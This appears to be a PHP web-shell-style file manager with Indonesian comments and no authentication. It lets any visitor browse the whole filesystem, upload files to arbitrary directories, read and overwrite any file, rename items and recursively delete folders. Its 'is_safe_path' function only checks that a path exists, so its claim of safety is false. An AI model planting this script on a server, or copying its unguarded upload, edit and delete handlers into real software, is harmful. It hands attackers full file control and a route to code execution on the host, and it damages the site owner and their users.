<?PhP
// Direktori awal tempat file diupload
$uploadDir = __DIR__; 

// Fungsi untuk memvalidasi jalur agar tetap aman
function is_safe_path($path) {
    return realpath($path) !== false; // Pastikan jalur valid
}

// Fungsi untuk menampilkan izin file dalam format octal
function getFilePermissions($file) {
    $permissions = fileperms($file);
    return substr(sprintf('%o', $permissions), -4);
}

// Fungsi untuk mengupload file
if (isset($_FILES['upload'])) {
    $uploadName = basename($_FILES['upload']['name']); // Ambil nama file asli
    $uploadTmp = $_FILES['upload']['tmp_name'];
    $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $uploadDir;

    // Validasi direktori tujuan
    if (!is_safe_path($targetDir) || !is_dir($targetDir)) {
        echo "<script>alert('Direktori tujuan tidak valid');</script>";
    } else {
        $uploadPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $uploadName;

        if (move_uploaded_file($uploadTmp, $uploadPath)) {
            echo "<script>alert('File berhasil diupload ke $uploadPath');</script>";
        } else {
            echo "<script>alert('Gagal mengupload file');</script>";
        }
    }
}

// Fungsi untuk mengedit file
if (isset($_GET['edit']) && is_file($_GET['edit']) && is_safe_path($_GET['edit'])) {
    $filePath = $_GET['edit'];

    if (isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('File berhasil disimpan');</script>";
    }

    echo '<form method="POST">';
    echo '<textarea name="content" style="width:100%;height:300px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>';
    echo '<br><input type="submit" value="Simpan">';
    echo '</form>';
    exit;
}

// Fungsi untuk menghapus file atau folder beserta isinya
function delete_directory($dir) {
    if (!is_dir($dir)) return false;

    $files = array_diff(scandir($dir), array('.', '..'));

    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            delete_directory($filePath); // Hapus folder secara rekursif
        } else {
            unlink($filePath); // Hapus file
        }
    }

    rmdir($dir); // Hapus folder setelah isinya terhapus
}

// Fungsi untuk menghapus file atau folder
if (isset($_GET['delete']) && is_safe_path($_GET['delete'])) {
    $deletePath = $_GET['delete'];

    if (is_file($deletePath)) {
        unlink($deletePath);
        echo "<script>alert('File berhasil dihapus');</script>";
    } elseif (is_dir($deletePath)) {
        delete_directory($deletePath); // Hapus folder beserta isinya
        echo "<script>alert('Folder beserta isinya berhasil dihapus');</script>";
    }
}

// Fungsi untuk mengganti nama file atau folder
if (isset($_GET['rename']) && isset($_POST['newName']) && is_safe_path($_GET['rename'])) {
    $oldPath = $_GET['rename'];
    $newName = $_POST['newName'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;

    if (rename($oldPath, $newPath)) {
        echo "<script>alert('Nama file atau folder berhasil diubah');</script>";
    } else {
        echo "<script>alert('Gagal mengganti nama file atau folder');</script>";
    }
}

// Fungsi untuk menampilkan breadcrumb path
function show_pwd($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $path = '';
    $pwd = '';

    foreach ($parts as $part) {
        $path .= DIRECTORY_SEPARATOR . $part;
        $pwd .= "<a href='?d=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}

// Direktori yang sedang dijelajahi
$dir = isset($_GET['d']) ? $_GET['d'] : $uploadDir;
$files = scandir($dir);

// Form untuk membuat folder baru
if (isset($_POST['createFolder'])) {
    $newFolderName = $_POST['folderName'];
    $newFolderPath = realpath($dir) . DIRECTORY_SEPARATOR . $newFolderName;

    if (!is_dir($newFolderPath)) {
        mkdir($newFolderPath);
        echo "<script>alert('Folder berhasil dibuat: $newFolderPath');</script>";
    } else {
        echo "<script>alert('Folder sudah ada');</script>";
    }
}

echo '<h2>Direktori Saat Ini (PWD)</h2>';
echo '<p>' . show_pwd($dir) . '</p>';

// Form untuk upload file
echo '<form method="POST" enctype="multipart/form-data">';
echo 'Pilih File: <input type="file" name="upload"><br>';
echo 'Direktori Tujuan: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '" style="width: 400px;"><br>';
echo '<input type="submit" value="Upload">';
echo '</form>';

// Form untuk membuat folder baru
echo '<form method="POST">';
echo 'Nama Folder Baru: <input type="text" name="folderName"><br>';
echo '<input type="submit" name="createFolder" value="Buat Folder Baru">';
echo '</form>';

echo '<ul>';
if ($dir !== '/') {
    // Tombol untuk kembali ke direktori sebelumnya
    echo '<li><a href="?d=' . urlencode(dirname($dir)) . '">.. (Kembali)</a></li>';
}

foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = realpath("$dir/$f");

    // Tampilkan file atau folder dengan izin dan tindakan
    if (is_dir($path)) {
        echo "<li>[DIR] <a href='?d=" . urlencode($path) . "'>$f</a> 
                <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta isinya?\");'>[Hapus]</a>
                <span>Permissions: " . getFilePermissions($path) . "</span></li>";
    } else {
        echo "<li>[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> 
                <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus file ini?\");'>[Hapus]</a> 
                <a href='?rename=" . urlencode($path) . "'>[Rename]</a>
                <span>Permissions: " . getFilePermissions($path) . "</span></li>";
    }
}
echo '</ul>';

// Form untuk rename file atau folder
if (isset($_GET['rename'])) {
    $renamePath = $_GET['rename'];
    echo '<form method="POST">';
    echo 'Nama Baru: <input type="text" name="newName" value="' . htmlspecialchars(basename($renamePath)) . '">';
    echo '<input type="submit" value="Ubah Nama">';
    echo '</form>';
}
?>
